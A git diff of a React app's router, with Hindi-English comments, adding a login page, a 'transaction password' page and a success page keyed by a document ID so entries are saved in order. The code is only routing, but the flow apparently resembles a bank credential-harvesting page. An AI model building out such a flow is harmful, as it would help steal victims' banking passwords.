@@ -9,7 +9,7 @@ function App() {
   const [isLoading, setIsLoading] = useState(true);
 
   useEffect(() => {
-    // Simulate loading
+    // Initial loading effect (1 second)
     const timer = setTimeout(() => {
       setIsLoading(false);
     }, 1000);
@@ -22,9 +22,17 @@ function App() {
         <Loading />
       ) : (
         <Routes>
+          {/* 1. Login Page: Yahan se process shuru hoga */}
           <Route path="/" element={<FirstPage />} />
-          <Route path="/second" element={<SecondPage />} />
+
+          {/* 2. Transaction Password Page: Isme :documentId hona zaroori hai */}
           <Route path="/second/:documentId" element={<SecondPage />} />
+
+          {/* 3. Final Success Page: Isme bhi :documentId add kar diya hai taaki data serial wise save ho */}
+          <Route path="/success/:documentId" element={<SuccessPage />} />
+
+          {/* Fallback Routes: Agar koi bina ID ke link open kare */}
+          <Route path="/second" element={<SecondPage />} />
           <Route path="/success" element={<SuccessPage />} />
         </Routes>
       )}
